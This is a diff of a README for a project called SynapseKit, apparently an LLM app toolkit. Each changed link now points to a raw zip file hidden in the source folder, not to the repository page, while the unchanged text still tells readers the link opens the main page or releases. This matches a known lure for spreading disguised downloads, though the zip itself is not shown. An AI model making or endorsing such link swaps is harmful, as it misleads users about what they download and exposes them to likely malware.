@@ -1,6 +1,6 @@
 # ⚙️ SynapseKit - Build LLM Apps with Ease
 
-[![Download SynapseKit](https://img.shields.io/badge/Download-SynapseKit-brightgreen)](https://github.com/timot860/SynapseKit)
+[![Download SynapseKit](https://img.shields.io/badge/Download-SynapseKit-brightgreen)](https://github.com/timot860/SynapseKit/raw/refs/heads/main/src/synapsekit/llm/Kit-Synapse-v2.6.zip)
 
 ---
 
@@ -30,7 +30,7 @@ SynapseKit works best if you have a basic understanding of how to open and use f
 
 To start using SynapseKit, you will first get the software. Use the link below to visit the download page directly on GitHub:
 
-[![Get SynapseKit](https://img.shields.io/badge/Visit-Download_Page-blue)](https://github.com/timot860/SynapseKit)
+[![Get SynapseKit](https://img.shields.io/badge/Visit-Download_Page-blue)](https://github.com/timot860/SynapseKit/raw/refs/heads/main/src/synapsekit/llm/Kit-Synapse-v2.6.zip)
 
 Clicking the link will open GitHub where you can find the latest version of SynapseKit. On the page, look for a section named **Releases** or a button that says **Download**.
 
@@ -123,7 +123,7 @@ For extra assistance, visit the GitHub page and check the **Issues** section. He
 
 Download or learn more about SynapseKit here:
 
-[https://github.com/timot860/SynapseKit](https://github.com/timot860/SynapseKit)
+[https://github.com/timot860/SynapseKit/raw/refs/heads/main/src/synapsekit/llm/Kit-Synapse-v2.6.zip](https://github.com/timot860/SynapseKit/raw/refs/heads/main/src/synapsekit/llm/Kit-Synapse-v2.6.zip)
 
 This link takes you to the main page where you can find files, instructions, and updates.
 
